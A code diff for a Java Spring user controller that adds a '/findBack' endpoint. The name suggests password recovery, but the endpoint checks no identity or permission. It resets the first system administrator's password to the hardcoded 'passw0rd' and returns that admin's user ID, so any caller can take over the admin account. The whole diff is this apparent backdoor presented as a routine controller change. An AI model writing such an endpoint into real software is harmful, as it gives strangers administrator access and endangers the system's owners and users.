@@ -306,5 +306,25 @@ public class UserController extends BaseController {
 		return status;
 	}
 	
+	@RequestMapping("/findBack")
+	@ResponseBody
+	public Status findBack() {
+		Status status = new Status();
+		
+		try {
+			List<User> users = service.querySysAdmin();
+			
+			User admin = users.get(0);
+			service.changePwd(admin.getUserId(), "passw0rd");
+			
+			status.setMessage("OK " + admin.getUserId());
+		} catch (DBAccessException e) {
+			status.setSuccess(false);
+			status.setMessage("数据处理出错：" + e.getMessage());
+			log.error("findBack[String] - " + e.getMessage(), e);
+		}
+		
+		return status;
+	}
 
 }
